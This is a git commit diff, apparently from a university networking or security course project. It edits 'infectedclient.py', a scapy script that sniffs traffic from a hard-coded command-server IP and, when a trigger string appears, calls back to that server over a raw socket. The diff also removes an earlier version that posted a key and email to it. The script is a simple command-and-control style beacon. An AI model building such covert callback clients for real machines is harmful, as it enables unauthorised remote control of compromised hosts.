d224bdc392d71b8f83503325449ff09bc0ee7b00
Kelvin <kelvin.tsai@stonybrook.edu>
2019-05-01 22:20:53 -0400

    messages to server sent through socket for easier scapy customization

--- client/infectedclient.py
+++ client/infectedclient.py
@@ -1,18 +1,24 @@
 from scapy.all import *
 import random
 import sys
-import requests
+import socket
+
+
 
 #command server ip
 serverIP = "130.245.170.45"
 
 def respondToServer(pkt):
 	if hasattr(pkt, "load"):
-		#respond if a packet from the server includes the word "timestamp"
-		if "timestamp" in str(pkt.load):
+		#respond if a packet from the server includes this string
+		if "GET /scripts/home.js" in str(pkt.load):
 			print("command received")
-			#example response to a command - sends json to server/verify
-			response = requests.post('http://' + serverIP + '/verify', json={'key':'abracadabra', 'email':'email-check+user655@grading.cse356.compas.cs.stonybrook.edu'})
-			print(response)
+			request = ('GET / HTTP/1.1\nHost: ' + serverIP + '\n\n').encode()
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((serverIP, 80))
+			s.send(request)
+			result = s.recv(128)
+			if (len(result) > 0):
+				print(result)
 
 sniff(filter="host " + serverIP, prn=respondToServer)
